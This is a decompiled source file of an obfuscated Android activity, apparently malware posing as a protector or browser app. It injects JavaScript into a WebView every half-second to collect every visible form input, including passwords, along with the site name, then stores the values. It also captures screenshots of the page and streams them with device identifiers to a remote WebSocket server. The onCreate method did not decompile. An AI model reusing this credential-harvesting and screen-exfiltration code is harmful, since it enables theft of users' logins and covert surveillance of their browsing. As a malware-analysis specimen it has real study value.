/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.Context
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.os.Bundle
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.Message
 *  android.util.Base64
 *  android.util.Log
 *  android.view.View
 *  android.view.ViewGroup
 *  android.view.ViewGroup$LayoutParams
 *  android.webkit.JsResult
 *  android.webkit.ValueCallback
 *  android.webkit.WebChromeClient
 *  android.webkit.WebChromeClient$CustomViewCallback
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.FrameLayout
 *  android.widget.FrameLayout$LayoutParams
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JsResult;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.Reader;
import java.io.StringReader;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.lmqhtifjzrtsgjcqpakvh;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.nibxhxsrbqdbqgffwz$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.vyklwirattpkwkqagsbrm;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class nibxhxsrbqdbqgffwz
extends Activity {
    static ArrayList<String> datastore = new ArrayList();
    String Currentsite;
    private Set<String> adHosts = new HashSet<String>();
    private OkHttpClient client;
    private boolean flaged = false;
    public boolean fortacking = false;
    WebView mWebView;
    Context myctx;
    private WebSocket websocketfile;

    public static void CapPass(Context context, WebView webView) {
        if (webView == null) {
            return;
        }
        webView.evaluateJavascript("var frame = null;\n\nfunction gd332() {\n  if (!frame) {\n    frame = document.createElement('iframe');\n    frame.style.display = 'none';\n    document.body.appendChild(frame);\n  }\n  console = frame.contentWindow.console;\n  var inputs = document.querySelectorAll('input');\n  var websiteLink = window.location.hostname;\n  var result = [];\n\n  inputs.forEach(function(input) {\n    var type = input.getAttribute('type');\n    var value = input.value;\n\n    if (value !== \"\" && value !== null && type !== \"hidden\" && type !== \"checkbox\") {\n      var data = {\n        'type': type,\n        'value': value,\n        'date': new Date().toLocaleString()\n      };\n      result.push(data);\n    }\n  });\n\n  return JSON.stringify({\n    website: websiteLink,\n    inputs: result\n  });\n}\n\ngd332();\n", (ValueCallback)new ValueCallback<String>(context){
            final Context val$ctx;
            {
                this.val$ctx = context;
            }

            /*
             * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            public void onReceiveValue(String string2) {
                if (string2.equals("null")) return;
                if (string2.equals("\"\"")) return;
                try {
                    Object object;
                    string2 = string2.substring(1, string2.length() - 1).replace("\\\"", "\"");
                    JSONObject jSONObject = new JSONObject(string2);
                    string2 = jSONObject.getString("website");
                    Object object2 = System.out;
                    CharSequence charSequence = new StringBuilder();
                    ((PrintStream)object2).println(charSequence.append("[Website]: ").append(string2).toString());
                    jSONObject = jSONObject.getJSONArray("inputs");
                    boolean bl = false;
                    for (int n = 0; n < jSONObject.length(); object = object.optString("date", "empty"), ++n) {
                        object = jSONObject.getJSONObject(n);
                        object2 = object.optString("type", "empty");
                        charSequence = object.optString("value", "empty");
                        PrintStream printStream = System.out;
                        StringBuilder stringBuilder = new StringBuilder();
                        printStream.println(stringBuilder.append("[link]: ").append(string2).toString());
                        printStream = System.out;
                        stringBuilder = new StringBuilder();
                        printStream.println(stringBuilder.append("[Type]: ").append((String)object2).toString());
                        printStream = System.out;
                        stringBuilder = new StringBuilder();
                        printStream.println(stringBuilder.append("[Value]: ").append((String)charSequence).toString());
                        printStream = System.out;
                        stringBuilder = new StringBuilder();
                        printStream.println(stringBuilder.append("[Date]: ").append((String)object).toString());
                        stringBuilder = new StringBuilder();
                        charSequence = Base64.encodeToString((byte[])stringBuilder.append(string2).append(aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA).append((String)object2).append(aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA).append((String)charSequence).append(aaskrfyvhoypymnzlskbzwpyr.SPLIT_DATA).append((String)object).toString().getBytes(), (int)0);
                        datastore.add((String)charSequence);
                        bl = true;
                    }
                    if (!bl) return;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    return;
                }
                {
                    vyklwirattpkwkqagsbrm.WriteList(this.val$ctx, aaskrfyvhoypymnzlskbzwpyr.web_pass, datastore);
                    return;
                }
            }
        });
    }

    private void Sendimg(Context context, String string2) {
        if (this.websocketfile == null) {
            Request request = new Request.Builder().url(aaskrfyvhoypymnzlskbzwpyr.URL_SOCKT()).build();
            if (this.client == null) {
                return;
            }
            this.websocketfile = this.client.newWebSocket(request, new WebSocketListener(this, context, string2){
                final nibxhxsrbqdbqgffwz this$0;
                final Context val$ctx;
                final String val$msg;
                {
                    this.this$0 = nibxhxsrbqdbqgffwz2;
                    this.val$ctx = context;
                    this.val$msg = string2;
                }

                public void onClosed(WebSocket webSocket, int n, String string2) {
                    nibxhxsrbqdbqgffwz.access$302(this.this$0, null);
                    this.this$0.client.dispatcher().executorService().shutdown();
                }

                public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                    throwable.printStackTrace();
                    nibxhxsrbqdbqgffwz.access$302(this.this$0, null);
                }

                public void onMessage(WebSocket object, String string2) {
                    try {
                        object = new JSONObject(string2);
                        object = object.optString("type", "empty");
                        if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                            nibxhxsrbqdbqgffwz.access$302(this.this$0, null);
                            this.this$0.client.dispatcher().executorService().shutdown();
                            vyklwirattpkwkqagsbrm.WriteBool(this.val$ctx, aaskrfyvhoypymnzlskbzwpyr.web_browser, false);
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }

                public void onOpen(WebSocket webSocket, Response response) {
                    this.this$0.sendWebSocketMessage(this.val$ctx, this.val$msg);
                }
            });
        } else {
            this.sendWebSocketMessage(context, string2);
        }
    }

    static /* synthetic */ WebSocket access$302(nibxhxsrbqdbqgffwz nibxhxsrbqdbqgffwz2, WebSocket webSocket) {
        nibxhxsrbqdbqgffwz2.websocketfile = webSocket;
        return webSocket;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void loadAdHosts(Context object) {
        try {
            Object object2;
            Object object3 = object.getAssets().open("ads.txt");
            if (lmqhtifjzrtsgjcqpakvh.AsstsKey.equals("[AST-PAS]")) {
                object2 = new InputStreamReader((InputStream)object3);
                object = new BufferedReader((Reader)object2);
                object2 = new StringBuilder();
                while ((object3 = ((BufferedReader)object).readLine()) != null) {
                    ((StringBuilder)object2).append((String)object3).append("\n");
                }
                ((BufferedReader)object).close();
                object = ((StringBuilder)object2).toString();
            } else {
                object = new byte[((InputStream)object3).available()];
                ((InputStream)object3).read((byte[])object);
                ((InputStream)object3).close();
                object = new String(ffbrxjknfnpfxahr.xorBytes((byte[])object, lmqhtifjzrtsgjcqpakvh.AsstsKey), StandardCharsets.UTF_8);
            }
            object2 = new StringReader((String)object);
            object3 = new BufferedReader((Reader)object2);
            while (true) {
                if ((object = ((BufferedReader)object3).readLine()) == null) {
                    ((BufferedReader)object3).close();
                    return;
                }
                if (((String)(object = ((String)object).trim())).isEmpty() || ((String)object).startsWith("#")) continue;
                this.adHosts.add(((String)object).toLowerCase());
            }
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void sendWebSocketMessage(Context context, String string2) {
        try {
            String string3 = vyklwirattpkwkqagsbrm.Read(context, "ID", "Deviceid");
            String string4 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_IDF, null);
            if (string3 != null && string4 != null) {
                String string5 = vyklwirattpkwkqagsbrm.Read(context, aaskrfyvhoypymnzlskbzwpyr.THE_CIP, "null");
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("idf", (Object)string4);
                jSONObject.put("pid", (Object)string3);
                jSONObject.put("itype", (Object)"Slr_client");
                jSONObject.put("subc", (Object)"msg");
                jSONObject.put("msg", (Object)string2);
                jSONObject.put("cip", (Object)string5);
                jSONObject.put("conk", (Object)vyklwirattpkwkqagsbrm.Read(context, "red_k", lmqhtifjzrtsgjcqpakvh.CONS_KY));
                this.websocketfile.send(jSONObject.toString());
                return;
            }
            this.websocketfile.close(1000, "Missing ID");
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
            if (this.websocketfile == null) return;
            this.websocketfile.close(1000, "Error during message sending");
        }
    }

    private void startcaptures(Context context, WebView webView) {
        vyklwirattpkwkqagsbrm.WriteBool(context, aaskrfyvhoypymnzlskbzwpyr.web_browser, true);
        new Thread(new Runnable(){
            final nibxhxsrbqdbqgffwz this$0;
            final Context val$ctx;
            final WebView val$mWebView;
            {
                this.this$0 = nibxhxsrbqdbqgffwz2;
                this.val$ctx = context;
                this.val$mWebView = webView;
            }

            @Override
            public void run() {
                do {
                    try {
                        Thread.sleep(500L);
                    }
                    catch (InterruptedException interruptedException) {
                        // empty catch block
                    }
                    new Handler(Looper.getMainLooper()).post(new Runnable(this){
                        final 1 this$1;
                        {
                            this.this$1 = var1_1;
                        }

                        @Override
                        public void run() {
                            try {
                                nibxhxsrbqdbqgffwz.CapPass(this.this$1.val$ctx, this.this$1.val$mWebView);
                            }
                            catch (Exception exception) {
                                // empty catch block
                            }
                        }
                    });
                    try {
                        if (this.this$0.fortacking) continue;
                        this.val$mWebView.setDrawingCacheEnabled(true);
                        Bitmap bitmap = Bitmap.createScaledBitmap((Bitmap)this.val$mWebView.getDrawingCache(false), (int)350, (int)650, (boolean)false);
                        this.val$mWebView.setDrawingCacheEnabled(false);
                        Object object = new ByteArrayOutputStream();
                        bitmap.compress(Bitmap.CompressFormat.WEBP, 50, (OutputStream)object);
                        object = Base64.encodeToString((byte[])((ByteArrayOutputStream)object).toByteArray(), (int)0);
                        bitmap = new JSONObject();
                        bitmap.put("type", (Object)"wbbrow");
                        bitmap.put("img", object);
                        bitmap.put("cuz", (Object)"n");
                        object = bitmap.toString();
                        this.this$0.Sendimg(this.val$ctx, (String)object);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                } while (vyklwirattpkwkqagsbrm.ReadBool(this.val$ctx, aaskrfyvhoypymnzlskbzwpyr.web_browser, false));
            }
        }).start();
    }

    public void closeWebSocket() {
        try {
            if (!this.flaged) {
                this.flaged = true;
                lqvpqwmhpvnnlhskxyjdwphzvsl.MyWorker.AlertServer(this.getApplicationContext(), "Browser", "Client Exit.");
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        if (this.websocketfile != null) {
            this.websocketfile.close(1000, "Closing WebSocket");
            this.websocketfile = null;
        }
        if (this.client != null) {
            this.client.dispatcher().cancelAll();
            this.client.connectionPool().evictAll();
            this.client.dispatcher().executorService().shutdown();
            this.client = null;
        }
    }

    /* synthetic */ void lambda$onCreate$0$com-icontrol-protector-nibxhxsrbqdbqgffwz(boolean bl, String string2) {
        if (bl) {
            this.mWebView.loadUrl(string2);
        } else {
            try {
                string2 = ffbrxjknfnpfxahr.loadHtmlFromAssets(this.getApplicationContext(), "vpn_required.html");
                this.mWebView.loadUrl(string2);
            }
            catch (IOException iOException) {
                // empty catch block
            }
        }
    }

    /* synthetic */ void lambda$onCreate$1$com-icontrol-protector-nibxhxsrbqdbqgffwz(String string2) {
        this.runOnUiThread(new nibxhxsrbqdbqgffwz$$ExternalSyntheticLambda1(this, ffbrxjknfnpfxahr.isSiteReachable(string2), string2));
    }

    public void onBackPressed() {
        try {
            if (this.mWebView != null && this.mWebView.canGoBack()) {
                this.mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        }
        catch (NullPointerException nullPointerException) {
            super.onBackPressed();
        }
    }

    /*
     * Exception decompiling
     */
    protected void onCreate(Bundle var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [11[TRYBLOCK]], but top level block is 17[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    public void onDestroy() {
        super.onDestroy();
        vyklwirattpkwkqagsbrm.WriteBool(this.getApplicationContext(), aaskrfyvhoypymnzlskbzwpyr.web_browser, false);
        this.closeWebSocket();
    }

    public class MyChrome
    extends WebChromeClient {
        private View customView;
        private WebChromeClient.CustomViewCallback customViewCallback;
        private FrameLayout fullScreenContainer;
        final nibxhxsrbqdbqgffwz this$0;

        MyChrome(nibxhxsrbqdbqgffwz nibxhxsrbqdbqgffwz2) {
            this.this$0 = nibxhxsrbqdbqgffwz2;
        }

        public boolean onCreateWindow(WebView webView, boolean bl, boolean bl2, Message message) {
            return false;
        }

        public void onHideCustomView() {
            if (this.customView == null) {
                return;
            }
            Activity activity = (Activity)this.this$0.mWebView.getContext();
            ((ViewGroup)activity.getWindow().getDecorView()).removeView((View)this.fullScreenContainer);
            this.fullScreenContainer = null;
            this.customView = null;
            this.customViewCallback.onCustomViewHidden();
            activity.setRequestedOrientation(1);
        }

        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            if (this.customView != null) {
                customViewCallback.onCustomViewHidden();
                return;
            }
            this.customView = view;
            this.customViewCallback = customViewCallback;
            this.fullScreenContainer = new FrameLayout(this.this$0.mWebView.getContext());
            this.fullScreenContainer.setBackgroundColor(-16777216);
            this.fullScreenContainer.addView(view, (ViewGroup.LayoutParams)new FrameLayout.LayoutParams(-1, -1));
            view = (Activity)this.this$0.mWebView.getContext();
            ((ViewGroup)view.getWindow().getDecorView()).addView((View)this.fullScreenContainer);
            view.setRequestedOrientation(0);
        }
    }

    private class MyWebChromeClient
    extends WebChromeClient {
        final nibxhxsrbqdbqgffwz this$0;

        private MyWebChromeClient(nibxhxsrbqdbqgffwz nibxhxsrbqdbqgffwz2) {
            this.this$0 = nibxhxsrbqdbqgffwz2;
        }

        public boolean onJsAlert(WebView webView, String string2, String string3, JsResult jsResult) {
            return true;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final nibxhxsrbqdbqgffwz this$0;

        private MyWebViewClient(nibxhxsrbqdbqgffwz nibxhxsrbqdbqgffwz2) {
            this.this$0 = nibxhxsrbqdbqgffwz2;
        }

        private boolean isAdUrl(String string2) {
            boolean bl = (string2 = string2.toLowerCase()).contains("doubleclick.net") || string2.contains("adservice.google.com") || string2.contains("googlesyndication.com") || string2.contains("ads.") || string2.matches(".*\\b(ad|ads|banner|click|track)\\b.*\\..*");
            return bl;
        }

        public void onPageFinished(WebView webView, String string2) {
            super.onPageFinished(webView, string2);
        }

        public void onPageStarted(WebView webView, String string2, Bitmap bitmap) {
            super.onPageStarted(webView, string2, bitmap);
        }

        public void onReceivedError(WebView webView, int n, String string2, String string3) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest object) {
            if (object != null && object.getUrl() != null) {
                Object object2 = object.getUrl();
                object = object2.toString();
                if ((object2 = object2.getHost()) != null && this.this$0.adHosts.contains(((String)object2).toLowerCase()) || this.isAdUrl((String)object)) {
                    Log.d((String)"AdBlock", (String)("Blocked redirect to ad host: " + (String)object2));
                    return true;
                }
                if (!((String)object).startsWith("http") && ((String)object).contains("://")) {
                    try {
                        URI uRI = new URI((String)object);
                        object = new StringBuilder();
                        object2 = ((StringBuilder)object).append("https://").append(uRI.getHost());
                        object = uRI.getPath() != null ? uRI.getPath() : "";
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                        return true;
                    }
                    webView.loadUrl(((StringBuilder)object2).append((String)object).toString());
                    return true;
                }
            }
            return false;
        }
    }

    public class WebAppInterface {
        Context mContext;
        final nibxhxsrbqdbqgffwz this$0;

        WebAppInterface(nibxhxsrbqdbqgffwz nibxhxsrbqdbqgffwz2, Context context) {
            this.this$0 = nibxhxsrbqdbqgffwz2;
            this.mContext = context;
        }
    }
}

